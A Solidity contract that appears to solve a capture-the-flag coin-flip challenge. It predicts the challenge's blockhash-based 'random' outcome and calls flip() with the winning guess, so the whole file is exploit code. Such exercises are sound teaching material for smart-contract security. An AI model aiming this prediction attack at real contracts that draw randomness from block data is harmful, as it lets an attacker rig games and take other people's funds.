pragma solidity ^0.7.3;
import '@openzeppelin/contracts/math/SafeMath.sol';

interface ICoinFlipChallenge {
    function flip(bool _guess) external returns (bool);
}

contract CoinFlipAttacker {
    using SafeMath for uint256;
    ICoinFlipChallenge public challenge;

    constructor(address challengeAddress) {
        challenge = ICoinFlipChallenge(challengeAddress);
    }

    function attack() external payable {
        uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
        uint256 blockValue = uint256(blockhash(block.number.sub(1)));

        uint256 coinFlip = blockValue.div(FACTOR);
        bool side = coinFlip == 1 ? true : false;

        challenge.flip(side);
    }
}
